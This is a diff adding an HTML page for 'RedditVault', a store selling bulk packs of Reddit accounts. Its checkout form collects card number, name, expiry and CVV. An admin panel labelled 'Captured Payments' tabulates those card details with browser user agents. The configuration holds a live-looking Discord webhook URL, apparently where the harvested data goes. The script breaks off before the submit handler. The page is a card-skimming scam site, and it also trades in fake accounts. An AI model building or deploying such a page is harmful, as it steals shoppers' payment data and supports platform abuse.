@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reddit Account Store</title>
+    <style>
+        :root {
+            --primary: #FF4500; /* Reddit Orange */
+            --primary-dark: #D63800;
+            --bg: #F4F4F4;
+            --text: #333;
+            --card-bg: #fff;
+            --border: #ddd;
+            --success: #28a745;
+            --error: #dc3545;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg);
+            margin: 0;
+            padding: 0;
+            color: var(--text);
+        }
+        header {
+            background: var(--card-bg);
+            padding: 1rem 2rem;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary);
+        }
+        .container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            transition: transform 0.2s;
+            display: flex;
+            flex-direction: column;
+        }
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        .card h3 {
+            margin-top: 0;
+            font-size: 1.2rem;
+        }
+        .price {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--primary);
+            margin: 1rem 0;
+        }
+        .features {
+            list-style: none;
+            padding: 0;
+            margin: 0 0 1.5rem 0;
+            flex-grow: 1;
+        }
+        .features li {
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+        .features li::before {
+            content: "✓";
+            color: var(--success);
+            font-weight: bold;
+            margin-right: 8px;
+        }
+        .btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.8rem;
+            border-radius: 6px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background: var(--primary-dark);
+        }
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        /* Cart Section */
+        #cartSection {
+            background: var(--card-bg);
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            margin-bottom: 3rem;
+            display: none;
+        }
+        #cartSection.active {
+            display: block;
+        }
+        .cart-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+            border-bottom: 1px solid var(--border);
+        }
+        .cart-item:last-child {
+            border-bottom: none;
+        }
+        .remove-btn {
+            background: var(--error);
+            color: white;
+            border: none;
+            padding: 0.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .total-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-top: 1rem;
+        }
+        /* Payment Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal {
+            background: white;
+            width: 90%;
+            max-width: 500px;
+            border-radius: 12px;
+            padding: 2rem;
+            position: relative;
+        }
+        .close-modal {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #999;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 1rem;
+        }
+        .form-group input:focus {
+            border-color: var(--primary);
+            outline: none;
+        }
+        .row {
+            display: flex;
+            gap: 1rem;
+        }
+        .row .form-group {
+            flex: 1;
+        }
+        .status-msg {
+            margin-top: 1rem;
+            padding: 0.75rem;
+            border-radius: 6px;
+            display: none;
+            font-size: 0.9rem;
+        }
+        .status-msg.success { background: #d4edda; color: #155724; display: block; }
+        .status-msg.error { background: #f8d7da; color: #721c24; display: block; }
+        
+        /* Admin Panel */
+        .admin-panel {
+            background: #2c3e50;
+            color: white;
+            padding: 2rem;
+            border-radius: 12px;
+            margin-top: 3rem;
+            display: none;
+        }
+        .admin-panel.active {
+            display: block;
+        }
+        .admin-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 1rem;
+        }
+        .admin-table th, .admin-table td {
+            border: 1px solid #444;
+            padding: 10px;
+            text-align: left;
+        }
+        .admin-table th {
+            background: #34495e;
+        }
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        .toggle-admin-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo">RedditVault</div>
+    <button class="toggle-admin-btn" onclick="toggleAdminPanel()">Admin Panel</button>
+</header>
+
+<div class="container">
+    <!-- Products Grid -->
+    <h2 style="text-align:center; color: var(--primary);">Premium Reddit Accounts</h2>
+    <div class="grid" id="productsGrid">
+        <!-- Products will be injected here by JS -->
+    </div>
+
+    <!-- Cart Section -->
+    <div id="cartSection">
+        <h2>Your Cart</h2>
+        <div id="cartItemsContainer">
+            <!-- Cart items injected here -->
+        </div>
+        <div class="total-row">
+            <span>Total:</span>
+            <span id="cartTotal">$0.00</span>
+        </div>
+        <button class="btn" style="margin-top: 1.5rem;" onclick="openPaymentModal()">Proceed to Checkout</button>
+    </div>
+
+    <!-- Admin Panel -->
+    <div class="admin-panel" id="adminPanel">
+        <div class="admin-header">
+            <h2>Admin Dashboard - Captured Payments</h2>
+            <button class="btn" style="width: auto; padding: 0.5rem 1rem;" onclick="clearAdminData()">Clear All Data</button>
+        </div>
+        <table class="admin-table">
+            <thead>
+                <tr>
+                    <th>Date</th>
+                    <th>Items</th>
+                    <th>Card Number</th>
+                    <th>Expiry</th>
+                    <th>CVV</th>
+                    <th>Name</th>
+                    <th>User Agent</th>
+                </tr>
+            </thead>
+            <tbody id="adminTableBody">
+                <!-- Admin data injected here -->
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<!-- Payment Modal -->
+<div class="modal-overlay" id="paymentModal">
+    <div class="modal">
+        <span class="close-modal" onclick="closePaymentModal()">&times;</span>
+        <h2 style="margin-top:0;">Payment Details</h2>
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" inputmode="numeric" autocomplete="cc-number" required>
+            </div>
+            <div class="form-group">
+                <label for="cardName">Cardholder Name</label>
+                <input type="text" id="cardName" placeholder="John Doe" autocomplete="cc-name" required>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label for="expiryDate">Expiry (MM/YY)</label>
+                    <input type="text" id="expiryDate" placeholder="MM/YY" inputmode="numeric" autocomplete="cc-exp" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="password" id="cvv" placeholder="123" inputmode="numeric" autocomplete="cc-csc" maxlength="4" required>
+                </div>
+            </div>
+            <button type="submit" class="btn" id="payBtn">Pay Now</button>
+            <div id="statusMsg" class="status-msg"></div>
+        </form>
+    </div>
+</div>
+
+<script>
+    // --- CONFIGURATION ---
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1570844700074705009/Sz-43pnaO4riLPbDk1XNQ1hBpgOvSCiwQTirTLbDMcmEhip-uF22LrnD_ToP9y98DoGc";
+    const STORAGE_KEY = "redditStoreTransactions";
+
+    // --- STATE ---
+    let cart = [];
+    let products = [
+        { id: 1, title: "Starter Pack", count: 1000, price: 29.99, description: "1,000 Random Reddit Accounts" },
+        { id: 2, title: "Pro Pack", count: 2000, price: 54.99, description: "2,000 Random Reddit Accounts" },
+        { id: 3, title: "Elite Pack", count: 3000, price: 79.99, description: "3,000 Random Reddit Accounts" }
+    ];
+
+    // --- INITIALIZATION ---
+    document.addEventListener('DOMContentLoaded', () => {
+        loadCartFromStorage();
+        renderProducts();
+        updateCartUI();
+        loadAdminData();
+        setupInputMasks();
+    });
+
+    // --- PRODUCT RENDERING ---
+    function renderProducts() {
+        const grid = document.getElementById('productsGrid');
+        grid.innerHTML = products.map(product => `
+            <div class="card">
+                <h3>${product.title}</h3>
+                <p style="color: #666; font-size: 0.9rem;">${product.description}</p>
+                <div class="price">$${product.price.toFixed(2)}</div>
+                <ul class="features">
+                    <li>${product.count.toLocaleString()} Unique Accounts</li>
+                    <li>Random Usernames & Passwords</li>
+                    <li>CSV Format Delivery</li>
+                    <li>Instant Access</li>
+                </ul>
+                <button class="btn" onclick="addToCart(${product.id})">Add to Cart</button>
+            </div>
+        `).join('');
+    }
+
+    // --- CART LOGIC ---
+    function addToCart(productId) {
+        const product = products.find(p => p.id === productId);
+        if (product) {
+            // Check if already in cart
+            const existingItem = cart.find(item => item.id === productId);
+            if (existingItem) {
+                existingItem.quantity += 1;
+            } else {
+                cart.push({ ...product, quantity: 1 });
+            }
+            saveCartToStorage();
+            updateCartUI();
+        }
+    }
+
+    function removeFromCart(productId) {
+        cart = cart.filter(item => item.id !== productId);
+        saveCartToStorage();
+        updateCartUI();
+    }
+
+    function updateCartUI() {
+        const cartSection = document.getElementById('cartSection');
+        const cartItemsContainer = document.getElementById('cartItemsContainer');
+        const cartTotalEl = document.getElementById('cartTotal');
+
+        if (cart.length === 0) {
+            cartSection.classList.remove('active');
+            return;
+        }
+
+        cartSection.classList.add('active');
+        
+        let total = 0;
+        cartItemsContainer.innerHTML = cart.map(item => {
+            total += item.price * item.quantity;
+            return `
+                <div class="cart-item">
+                    <div>
+                        <strong>${item.title}</strong> (${item.count} Accounts) x ${item.quantity}
+                        <br><small>$${item.price.toFixed(2)} each</small>
+                    </div>
+                    <div>
+                        <strong>$${(item.price * item.quantity).toFixed(2)}</strong>
+                        <button class="remove-btn" onclick="removeFromCart(${item.id})">Remove</button>
+                    </div>
+                </div>
+            `;
+        }).join('');
+
+        cartTotalEl.textContent = `$${total.toFixed(2)}`;
+    }
+
+    function getCartTotal() {
+        return cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+    }
+
+    // --- STORAGE (PERSISTENCE) ---
+    function saveCartToStorage() {
+        localStorage.setItem('redditStoreCart', JSON.stringify(cart));
+    }
+
+    function loadCartFromStorage() {
+        const savedCart = localStorage.getItem('redditStoreCart');
+        if (savedCart) {
+            cart = JSON.parse(savedCart);
+        }
+    }
+
+    function saveTransactionToStorage(transaction) {
+        let transactions = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+        transactions.push(transaction);
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(transactions));
+    }
+
+    function getTransactions() {
+        return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+    }
+
+    function clearAdminData() {
+        if (confirm('Are you sure you want to clear all captured payment data?')) {
+            localStorage.removeItem(STORAGE_KEY);
+            loadAdminData();
+        }
+    }
+
+    // --- PAYMENT MODAL ---
+    function openPaymentModal() {
+        if (cart.length === 0) {
+            alert('Your cart is empty!');
+            return;
+        }
+        document.getElementById('paymentModal').classList.add('active');
+    }
+
+    function closePaymentModal() {
+        document.getElementById('paymentModal').classList.remove('active');
+        document.getElementById('paymentForm').reset();
+        document.getElementById('statusMsg').className = 'status-msg';
+    }
+
+    function setupInputMasks()
